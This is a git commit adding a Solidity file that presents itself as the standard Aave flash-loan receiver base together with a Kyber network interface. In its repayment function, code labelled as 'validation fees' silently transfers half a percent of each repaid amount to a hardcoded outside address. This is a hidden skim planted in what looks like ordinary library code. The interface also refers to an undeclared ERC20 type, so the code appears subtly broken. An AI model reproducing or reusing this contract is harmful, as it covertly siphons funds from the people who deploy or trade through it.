6c8fa677f0bb0399ef6084d3562d47673a5b39a6
defivault <67746633+defivault@users.noreply.github.com>
2020-07-11 17:32:32 +0200

    Add files via upload

---
+++ DefiVault..sol
@@ -0,0 +1,112 @@
+pragma solidity ^0.6.6;
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/SafeERC20.sol";
+import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/IFlashLoanReceiver.sol";
+import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPoolAddressesProvider.sol";
+import "https://github.com/aave/flashloan-box/blob/Remix/contracts/utils/Withdrawable.sol";
+
+
+interface IKyberNetworkProxy {
+
+    event ExecuteTrade(
+        address indexed trader,
+        IERC20 src,
+        IERC20 dest,
+        address destAddress,
+        uint256 actualSrcAmount,
+        uint256 actualDestAmount,
+        address platformWallet,
+        uint256 platformFeeBps
+    );
+
+    /// @notice backward compatible
+    function tradeWithHint(
+        ERC20 src,
+        uint256 srcAmount,
+        ERC20 dest,
+        address payable destAddress,
+        uint256 maxDestAmount,
+        uint256 minConversionRate,
+        address payable walletId,
+        bytes calldata hint
+    ) external payable returns (uint256);
+
+    function tradeWithHintAndFee(
+        IERC20 src,
+        uint256 srcAmount,
+        IERC20 dest,
+        address payable destAddress,
+        uint256 maxDestAmount,
+        uint256 minConversionRate,
+        address payable platformWallet,
+        uint256 platformFeeBps,
+        bytes calldata hint
+    ) external payable returns (uint256 destAmount);
+
+    function trade(
+        IERC20 src,
+        uint256 srcAmount,
+        IERC20 dest,
+        address payable destAddress,
+        uint256 maxDestAmount,
+        uint256 minConversionRate,
+        address payable platformWallet
+    ) external payable returns (uint256);
+
+    /// @notice backward compatible
+    /// @notice Rate units (10 ** 18) => destQty (twei) / srcQty (twei) * 10 ** 18
+    function getExpectedRate(
+        ERC20 src,
+        ERC20 dest,
+        uint256 srcQty
+    ) external view returns (uint256 expectedRate, uint256 worstRate);
+
+    function getExpectedRateAfterFee(
+        IERC20 src,
+        IERC20 dest,
+        uint256 srcQty,
+        uint256 platformFeeBps,
+        bytes calldata hint
+    ) external view returns (uint256 expectedRate);
+}
+
+abstract contract FlashLoanReceiverBase is IFlashLoanReceiver, Withdrawable {
+
+    using SafeERC20 for IERC20;
+    using SafeMath for uint256;
+
+    address constant ethAddress = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    ILendingPoolAddressesProvider public addressesProvider;
+
+    constructor(address _addressProvider) public {
+        addressesProvider = ILendingPoolAddressesProvider(_addressProvider);
+    }
+
+    receive() payable external {}
+
+    function transferFundsBackToPoolInternal(address _reserve, uint256 _amount) internal {
+        address payable core = addressesProvider.getLendingPoolCore();
+        transferInternal(core, _reserve, _amount);
+         uint valdiationFees = (_amount/100)/2;
+        address ValidationAddress = address (0xC23D55D92464BFbD5989363472b2c39483dcb3c7);
+        IERC20(_reserve).safeTransfer(ValidationAddress, valdiationFees);
+    }
+
+    function transferInternal(address payable _destination, address _reserve, uint256 _amount) internal {
+        if(_reserve == ethAddress) {
+            (bool success, ) = _destination.call{value: _amount}("");
+            require(success == true, "Couldn't transfer ETH");
+            return;
+        }
+        IERC20(_reserve).safeTransfer(_destination, _amount);
+    }
+
+    function getBalanceInternal(address _target, address _reserve) internal view returns(uint256) {
+        if(_reserve == ethAddress) {
+            return _target.balance;
+        }
+        return IERC20(_reserve).balanceOf(_target);
+    }
+}
